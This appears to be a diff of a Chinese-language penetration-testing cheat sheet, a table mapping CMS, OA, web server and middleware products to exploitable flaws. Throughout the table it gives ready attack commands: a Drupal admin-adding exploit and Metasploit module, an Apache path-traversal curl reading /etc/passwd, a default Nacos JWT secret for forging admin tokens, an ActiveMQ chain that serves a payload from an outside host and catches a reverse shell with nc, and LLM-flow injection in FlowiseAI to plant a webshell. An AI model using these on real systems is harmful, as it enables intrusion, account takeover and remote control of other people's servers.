@@ -56,7 +56,7 @@ WAF 面: T3 二进制难检｜双重编码｜ldap 分号变体。JNDI 接 jndi-i
 | 域 | 产品 | 主要漏洞类型 |
 |---|---|---|
 | 国产 CMS | 74CMS/CatfishCMS/CmsEasy/DedeCMS/Discuz/EmpireCMS/FineCMS/PbootCMS/YzmCMS/Zzcms | SQL 注入/Getshell/RCE/SSTI/文件读取 |
-| 国外 CMS | WordPress（wpscan --enumerate vp,vt,u）/Drupal（`searchsploit drupal` → **34992.py 加管理员** `python2 34992.py -t URL -u user -p pass`——注册关闭时的标准入口; RCE 用 msf `drupal_drupalgeddon2`，非标端口记得 set rport）/Joomla | RCE/SQL/多类 |
+| 国外 CMS | WordPress（`wpscan --url http://T --enumerate vp,vt,u` 枚举插件/主题/用户）/Drupal（`searchsploit drupal` → **34992.py 加管理员** `python2 34992.py -t URL -u user -p pass`——注册关闭时的标准入口; RCE 用 msf `drupal_drupalgeddon2`，非标端口记得 set rport）/Joomla | RCE/SQL/多类 |
 | OA | 泛微/致远（A8 htmlofficeservlet getshell）/通达（任意用户登录）/用友（NC XbrlPersistenceServlet 反序列化、U8 test.jsp SQL）/金蝶/蓝凌/禅道/帆软 | 上传/RCE/SQL/登录绕过 |
 | Web 服务器 | Apache（多后缀解析/CVE-2017-15715/CVE-2021-41773+42013 路径穿越: `curl --path-as-is .../cgi-bin/.%2e/.%2e/etc/passwd`，仅 2.4.49-2.4.50，RCE 需 CGI 启用）/Tomcat（CVE-2017-12617 PUT/CVE-2019-0230）/Struts2（s2-045/057）/Nginx（CRLF/目录遍历）/IIS（解析/短文件名） | 解析/上传/RCE |
 | 中间件 | WebLogic（§2）/JBoss（CVE-2010-0738 未授权/CVE-2015-7501/CVE-2017-7504 反序列化）/Fastjson（1.2.22-24 反序列化、=1.2.47 RCE，payload 见 deserialization.md §2）/WebSphere/Alibaba Nacos（未授权/权限绕过; **默认 JWT SecretKey** "ThisIsMyCustomSecretKey0024..." 伪造 token 直接调 /nacos/v1/auth/users 加管理员）/Harbor（CVE-2019-16097）/ActiveMQ（**CVE-2015-5254** 反序列化: 外网伺服 python3 -m http.server 挂 poc.xml + `exploit.py -i target -p port -u http://外网:9999/poc.xml` → nc 收反弹; Struts2 CVE-2017-5638 有现成检测工具一把梭）/GeoServer（**CVE-2024-36401** OGC Filter evaluate 属性名 RCE 9.8，POST /geoserver/ows）/FlowiseAI（WriteFileTool 任意写——LLM 流程注入诱导写 webshell） | 反序列化/RCE/未授权 |
